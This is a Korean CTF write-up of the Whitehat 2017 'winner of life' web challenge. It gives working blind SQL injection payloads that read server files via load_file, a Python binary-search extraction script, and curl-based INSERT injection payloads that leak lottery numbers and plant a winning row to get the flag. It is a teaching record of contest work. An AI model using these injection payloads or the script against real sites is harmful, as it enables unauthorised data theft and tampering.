# [WEB] Whitehat 2017 - winner of life

## Description

>  https://309d24f0f1f4d43c7640b02baa5d8667.whitehatcontest.kr/

## Analysis

뭔가 로또 사이트 처럼 보이는 페이지이다.

간단하게 회원가입을 한 후 로그인 해보자.

그 후 Buy 메뉴에 들어가 적당한 숫자에 체크해준 후 Submnit하면 `Your luckyNumber is 1,12,23,34,45,56,68. Good luck!`이라는 문자열과 함께 로또를 사게 된다.

History 메뉴에 들어가면 지금까지 샀던 로또 결과가 나온다.

| ROUND | MY NUMBERS          | TIME                |
| ----- | ------------------- | ------------------- |
| 38128 | 1,12,23,34,45,56,67 | 2017-11-06 11:26:06 |

음 뭐가 당첨이고 아닌지 모르겠다.

Statistics메뉴에 들어가보자.

URL을 보면 `https://309d24f0f1f4d43c7640b02baa5d8667.whitehatcontest.kr/?p=statistics&no=1` 다음과 같은데, 뭔가 굉장히 no에서 인젝션이 될거 같이 생겼다.

또한 메인 페이지의 소스를 보면 맨 아래 아래와 같은 주석을 확인할 수 있다.

```html

<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Winner Of Life</title>

    <!-- Bootstrap core CSS -->
    <link href="dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="dist/css/signin.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="dist/js/ie-emulation-modes-warning.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>


<!-- 합쳐지고 최소화된 최신 CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">

<!-- 부가적인 테마 -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap-theme.min.css">

<!-- 합쳐지고 최소화된 최신 자바스크립트 -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>
    <nav class="navbar navbar-inverse navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="./">Lo77ery</a>
        </div>
        <div id="navbar" class="collapse navbar-collapse">
          <ul class="nav navbar-nav">
            <li><a href="./">Home</a></li>
                        <li><a href="/?p=login">Login</a></li>            <li><a href="/?p=reg">Register</a></li>          </ul>
        </div>
      </div>
    </nav>

    <div class="container">

      <div class="starter-template">
        <h1>Lucky Lo77ery</h1>
        <p class="lead">One chance per 5 Min!<br>If you catch lucky, You will be winner on life!<br> Last generating time : 2017-11-06 16:05:01(on server time.)</p>
	<img src="main.png"/>
      </div>

    </div>


    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
    <script src="./dist/js/bootstrap.min.js"></script>
    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  

</body>
<!-- leak.tar -->

```

leak.tar를 얼른 받아보았다.

var_dump.txt와 cron_info.txt를 얻을 수 있다.

var_dump.txt의 내용은 잘 모르겠으니 cron_info.txt에서 힌트를 얻을 수 있다.

```bash
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5  * 	* * * 	root 	php /var/www/html/e57717591ebe1d829b3def08f229a53b.php
#
```

e57717591ebe1d829b3def08f229a53b.php파일이 존재하는 모양이다.

# Exploit

SQL인젝션으로 소스코드를 읽어보자.

no의 값으로 `0%20union%20select%20(select%20strcmp(mid((select%20load_file(%27/var/www/html/e57717591ebe1d829b3def08f229a53b.php%27)),1,1),0x41)),3,2`

를 넣을 경우 0x41보다 크면 1 작으면 -1 같으면 0의 결과를 통해 소스코드를 읽을 수 있다.

코드를 작성해보자.

```python
import requests
from urllib import quote
import sys

url = 'https://309d24f0f1f4d43c7640b02baa5d8667.whitehatcontest.kr/?p=statistics&no='
q = lambda f,x,y:quote("0 union select (select strcmp(mid((select load_file((select 0x%s))),%d,1),(select 0x%s))),3,2"%(f,x,y))

def bs(x,Min,Max):
    if Min>Max:
        return -1
    pivot = (Min+Max)/2
    tmp_url = url + q(sys.argv[1].encode('hex'),x,hex(pivot)[2:])
    r = requests.get(tmp_url).text
    r = r.split('ROUND : ')[1].split('<br>')[0]
    if r=='0':
    	return pivot
    elif r=='1':
    	return bs(x,pivot+1,Max)
    else:
    	return bs(x,Min,pivot-1)

for x in range(1,10000):
	tmp = bs(x,0,127)
	if tmp<1:
		break
	sys.stdout.write(chr(tmp))
	sys.stdout.flush()
```

이를 통해 e57717591ebe1d829b3def08f229a53b.php를 긁어보았다.

```Php
#!/usr/bin/php
<?php
	include '9en3rat0r.php';
	include 'd6conn.php';
	//if(time()>1509576900)
	//{
		### MAKE LOTTO NUMBERS ###
		$luckyNumber = generator();
		sort($luckyNumber);
		$luckyNumber = implode(",",$luckyNumber);

		### CHECK ROUND ###
		$round = getRound($conn);

		### CHECK WINNER ###
		$q = "SELECT * FROM ATTEMPT WHERE no={$round}";
		$res =mysqli_query($conn,$q);
		$Winners = array();
		while($row = mysqli_fetch_array($res))
		{
			if($luckyNumber == $row['numbers'])
				array_push($Winners,$row['name']);
		}

		### WRITE HISTORY ###
		$Winners = implode(",",$Winners);
		$q = "INSERT INTO LOG(luckyNumbers,winners) values('{$luckyNumber}','{$Winners}')";
		$res = mysqli_query($conn,$q);

		### WRITE CURRENT TIME ###
		$f = fopen("/var/www/T1M3","w");
		fwrite($f,date("Y-m-d H:i:s"));
		fclose($f);
	//}
?>
```

오 뭔가 9en3rat0r.php를 통해 로또 값을 생성하는 것 같으니 이를 긁어보자.

```php
<?php
function generator()
{
	$PATH = "/var/www/s3cre7_fi1e";
	$init_seed = 0;
	if(!file_exists(realpath($PATH)))
	{
		$init_seed = $seed = intval(uniqid(),10);
		$f = fopen($PATH,"w");
		fwrite($f,$init_seed);
		fclose($f);
	}
	
	$f = fopen($PATH,"r");
	$data = fread($f,filesize($PATH));
	$init_seed = $seed = intval($data,10);

	srand($init_seed);
	for( $i=0; $i<$init_seed%100; $i++)
	{
		$seed = rand() * rand();
		srand($seed);
		$tmp = rand()*rand();
		$length = strlen($tmp);
		$cutting = (int)($length/4);
		$tmp2= substr($seed,$cutting,$length-$cutting*2);
		$seed = $tmp2*$tmp2;
	}
	$ret = array(7);
	$new_seed = 0;
	for( $i=0; $i<7; $i++)
	{	$new_seed = rand();
		$number = ($new_seed%77)+1;
		if(in_array($number,$ret))
		{
			$i--;
			continue;
		}
		$ret[$i] = $number;
	}
	$f = fopen($PATH,"w");
	fwrite($f,$new_seed);
	fclose($f);
	return $ret;
	
}
?>
```

와 어떤 파일의 값을 통해 시드를 설정하고 그 값을 따라 로또 값을 생성해 주는 로직이다.

다른 소스 파일을 찾던중 buy_check.php을 보았으며 흥미로운 부분을 발견하였다.

```php
session_start();
include 'd6conn.php';
if(!$_SESSION['id'])
  die('<script> alert("LOGIN FIRST"); location.href="./?p=login"; </script>');
### CHECK VALID VALUE ###
if(sizeof($_POST) != 7)
  die("<script> alert('You MUST check exactly 7 numbers.'); history.go(-1);</script>");
foreach( $_POST as $k => $v )
{
  if($k != $v)
    die("<script> alert('Input error.. Intersting..'); history.go(-1);</script>");
  if(!is_numeric($k))
    die("<script> alert('DO NOT MODIFY NUMBERS TO STRING'); history.go(-1);</script>");
}

### INSERT TO DATABASE ###
$Data = implode(",",$_POST);
$Round = getRound($conn);
$time = date("Y-m-d H:i:s");
$q = "INSERT INTO ATTEMPT value('{$Round}','{$_SESSION['id']}','{$Data}','{$_SERVER['REMOTE_ADDR']}','{$time}')";
$res = mysqli_query($conn,$q);
if( mysqli_errno($conn) == 1062 )
  die("<script> alert('You already attempt this round. Please wait.'); location.href='./';</script>");
else
  die("<script> alert('Your luckyNumber is ".$Data.". Good luck!'); location.href='./';</script>");

```

INSERT문을 보면 굉장히 insert injection이 일어날거 같이 생기지 않았는가!?

data로 `1=1&12=12&23=23&34=34&45=45&56=56&67=67a','2','2'),('38300','p',(select luckyNumbers from LOG where no like 1),'1','1'),('38300','p','aa"`를 넘겨 1회차의 로또 숫자를 찾아보자.

```
curl 'https://309d24f0f1f4d43c7640b02baa5d8667.whitehatcontest.kr' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: ko-KR,ko;q=0.8,en-US;q=0.6,en;q=0.4,ja;q=0.2' -H 'upgrade-insecure-requests: 1' -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36' -H 'content-type: application/x-www-form-urlencoded' -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'cache-control: max-age=0' -H 'authority: 309d24f0f1f4d43c7640b02baa5d8667.whitehatcontest.kr' -H 'cookie: PHPSESSID=a0cmir8d39na2bp55afslrbl41; AWSALB=a2MnW4UGclq0LCGuexMuNvOCPWm8i6TV+jhbjqOU07fv8pHS4EDP6LOnqi7/F8FU+MIWzDR0kAFGa/2CXX7OT0c963CALQTV49KFNXRcK/okx9V0Fq3kAmkEuJoQ' -H 'referer: https://309d24f0f1f4d43c7640b02baa5d8667.whitehatcontest.kr/?p=buy' --data "1=1&12=12&23=23&34=34&45=45&56=56&67=67a','2','2'),('38300','p',(select luckyNumbers from LOG where no like 1),'1','1'),('38300','p','aa" --compressed
```

이를 수행한 후 history에 들어가면 다음과 같이 로또 값을 획득할 수 있다.

| ROUND | MY NUMBERS           | TIME                |
| ----- | -------------------- | ------------------- |
| 38205 | 1,12,23,34,45,56,67  | 1                   |
| 38205 | 1,12,23,34,45,56,67  | 2017-11-06 17:41:09 |
| 38206 | 1,12,23,34,45,56,67a | 2                   |
| 38300 | 6,9,16,30,33,37,58   | 1                   |
| 38300 | aa                   | 2017-11-06 17:46:49 |

여기서 획득한 로또 값을 통해 다시 인젝션을 한다.

data로 `1=1&12=12&23=23&34=34&45=45&56=56&68=68','1','1'),('1','sh','6,9,16,30,33,37,58`를 넘기자.

```bash
curl 'https://309d24f0f1f4d43c7640b02baa5d8667.whitehatcontest.kr/buy_check.php' -in: https://309d24f0f1f4d43c7640b02baa5d8667.whitehatcontest.kr' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: ko-KR,ko;q=0.8,en-US;q=0.6,en;q=0.4,ja;q=0.2' -H 'upgrade-insecure-requests: 1' -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36' -H 'content-type: application/x-www-form-urlencoded' -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'cache-control: max-age=0' -H 'authority: 309d24f0f1f4d43c7640b02baa5d8667.whitehatcontest.kr' -H 'cookie: PHPSESSID=gcoe1o75sf35hr70v3ub14q0k6; AWSALB=Kw2xupsLvjTuWXdj+wADSrRxZXXTo8dA5IKRrpCefyQbnM7T9C7blRox8qXPakVKFkOU19vmNLWPlU0Z1aWXGXhhUuzzO4cfplpPAXji6Da9rV/Ob04vc3ka0gOu' -H 'referer: https://309d24f0f1f4d43c7640b02baa5d8667.whitehatcontest.kr/?p=buy' --data "1=1&12=12&23=23&34=34&45=45&56=56&68=68','1','1'),('1','sh','6,9,16,30,33,37,58" --compressed
```

뭔가 등록된거 같으니 history메뉴에 들어가자.

| ROUND | MY NUMBERS              | TIME                |
| ----- | ----------------------- | ------------------- |
| 1     | FLAG{Wa11eT_I5_H0W1IN9} | 2017-11-06 11:36:17 |
| 38128 | 1,12,23,34,45,56,67     | 2017-11-06 11:26:06 |
| 38130 | 1,12,23,34,45,56,68     | 1                   |

Halo~~

플래그를 얻을 수 있다.



**FLAG{Wa11eT_I5_H0W1IN9}**